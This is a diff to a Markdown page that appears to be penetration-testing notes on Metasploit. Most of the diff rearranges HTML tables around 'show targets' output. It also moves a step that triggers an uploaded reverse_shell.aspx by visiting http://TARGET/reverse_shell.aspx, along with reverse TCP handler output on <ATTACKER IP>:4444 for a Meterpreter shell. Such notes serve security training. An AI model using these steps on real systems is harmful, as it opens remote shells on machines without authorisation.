@@ -655,37 +655,10 @@ show targets
 
 </td>
 </tr>
-</table>
-
-Regular output:
-
-<table width="100%">
 <tr>
-<td> 📄 <b>Output</b> </td>
-</tr>
-<tr>
-<td>
+<td colspan="2">
 
-```
-Exploit targets:
-
-   Id  Name
-   --  ----
-   0   Automatic
-```
-
-</td>
-</tr>
-</table>
-
-Exploit-specific output:
-
-<table width="100%">
-<tr>
-<td> 📄 <b>Output</b> </td>
-</tr>
-<tr>
-<td>
+---
 
 ```
 Exploit targets:
@@ -2435,20 +2408,10 @@ run
 
 </td>
 </tr>
-</table>
-
-**Executing the Payload**
-
-_Navigate to the upload path_ (e.g. http://TARGET/reverse_shell.aspx)
-
-**MSF - Meterpreter Shell**
-
-<table width="100%">
 <tr>
-<td> 📄 <b>Output</b> </td>
-</tr>
-<tr>
-<td>
+<td colspan="2">
+
+---
 
 ```
 [*] Started reverse TCP handler on <ATTACKER IP>:4444
@@ -2460,6 +2423,10 @@ _Navigate to the upload path_ (e.g. http://TARGET/reverse_shell.aspx)
 </td>
 </tr>
 </table>
+
+**Executing the Payload**
+
+_Navigate to the upload path_ (e.g. http://TARGET/reverse_shell.aspx) to trigger the connection above.
 
 <table width="100%">
 <tr>
